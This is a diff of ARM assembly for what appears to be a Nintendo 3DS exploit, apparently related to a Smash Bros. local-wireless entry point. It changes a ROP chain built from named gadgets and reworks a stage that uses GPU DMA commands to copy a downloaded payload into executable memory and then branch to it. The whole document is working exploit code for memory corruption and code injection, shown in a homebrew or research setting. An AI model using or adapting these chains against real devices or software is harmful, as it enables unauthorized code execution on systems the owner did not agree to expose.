@@ -36,17 +36,17 @@ ropstart:
 
 .word GSPGPU_FLUSHDCACHE
 
-.word POP_LRPC
-.word POP_R0R4SLIPPC @ lr
-
 .word POP_R0R4SLIPPC
 .word TMPBUF_ADR @ r0, srcaddr
-.word 0x30000000+TEXT_FCRAMOFFSET @ r1, dstaddr
+.word 0 @ r1, dstaddr (actual value gets loaded by the following ROP gadget)
 .word 0x400 @ r2, size
 .word 0 @ r3, width0
 .word 0 @ r4
 .word 0 @ sl
 .word 0 @ ip
+
+.word ROP_LDRR1R5_MOVR0R8_BLXR7 @ See smashbros_beaconoui15.s.
+.word POP_R0R4SLIPPC @ lr
 
 .word GXLOW_CMD4
 
@@ -81,7 +81,6 @@ bx r1
 
 bl init_sp
 
-ldr r0, =0x30000000
 bl overwrite_framebufs
 
 ldr r0, =LOCALWLAN_SHUTDOWN
@@ -419,24 +418,20 @@ blx svcCloseHandle
 cmp r4, #0
 beq download_payload_end
 
+ldr r7, =0x1000
+lsl r1, r7, #2
+
 mov r0, r6
-ldr r1, =0x4000
 ldr r2, =GSPGPU_FLUSHDCACHE
 blx r2
 
-mov r3, #0
-str r3, [sp, #0] @ height0
-str r3, [sp, #4] @ width1
-str r3, [sp, #8] @ height1
-mov r3, #8
-str r3, [sp, #12] @ flags
-mov r0, r6
-ldr r1, =(0x30000000+TEXT_FCRAMOFFSET+0x100000) @ dstaddr
+mov r0, r6 @ srcaddr
+ldr r1, =GXLOWCMD4_DSTADR_PTR
+ldr r1, [r1]
+lsl r2, r7, #8
+add r1, r1, r2 @ dstaddr
 ldr r2, =0x4000 @ size
-mov r3, #0 @ width0
-
-ldr r5, =GXLOW_CMD4
-blx r5
+bl cpydat_gxlowcmd4
 
 ldr r0, =1000000000
 mov r1, #0
@@ -445,12 +440,11 @@ blx r2
 
 mov r1, #0
 mov r2, r1
-ldr r3, =0x1000
 
 download_payload_memclr:
 str r2, [r6, r1]
 add r1, r1, #4
-cmp r1, r3
+cmp r1, r7
 blt download_payload_memclr
 
 ldr r1, =GXLOW_CMD4
@@ -463,7 +457,7 @@ ldr r1, =GSPGPU_SERVHANDLEADR
 str r1, [r6, #0x58]
 
 mov r0, r6
-ldr r1, =0x00200000
+lsl r1, r7, #9
 blx r1
 
 download_payload_end:
@@ -471,13 +465,16 @@ b download_payload_end
 .pool
 
 overwrite_framebufs:
+ldr r0, =0x30000000
+ldr r1, =0x1f000000
+ldr r2, =0x100000
+
+cpydat_gxlowcmd4: @ r0=srcadr, r1=dstadr, r2=size
 push {r4, r5, lr}
 sub sp, sp, #32
 
 mov r3, #8
 str r3, [sp, #12] @ flags
-ldr r1, =0x1f000000 @ dstaddr
-ldr r2, =0x100000
 mov r3, #0 @ width0
 
 ldr r5, =GXLOW_CMD4
